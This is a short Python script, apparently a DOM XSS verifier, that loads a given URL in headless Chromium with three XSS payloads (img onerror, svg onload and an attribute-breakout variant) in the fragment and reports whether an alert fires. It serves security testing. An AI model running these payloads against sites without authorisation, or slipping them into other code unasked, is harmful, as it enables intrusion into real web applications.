# verifier.py
from playwright.sync_api import sync_playwright, TimeoutError

PAYLOADS = [
    "<img src=x onerror=alert(1337)>",
    "<svg/onload=alert(1337)>",
    "'\"><img src=x onerror=alert(1337)>"
]

def verify_dom_xss(url: str, timeout: int = 15000) -> bool:
    """
    Returns True if DOM XSS is exploitable at runtime, else False
    """
    with sync_playwright() as p:
        browser = p.chromium.launch(headless=True)
        page = browser.new_page()

        exploitable = False

        def on_dialog(dialog):
            nonlocal exploitable
            exploitable = True
            dialog.dismiss()

        page.on("dialog", on_dialog)

        for payload in PAYLOADS:
            try:
                test_url = f"{url}#{payload}"
                page.goto(test_url, timeout=timeout)
                page.wait_for_timeout(3000)

                if exploitable:
                    break

            except TimeoutError:
                continue
            except Exception:
                continue

        browser.close()
        return exploitable
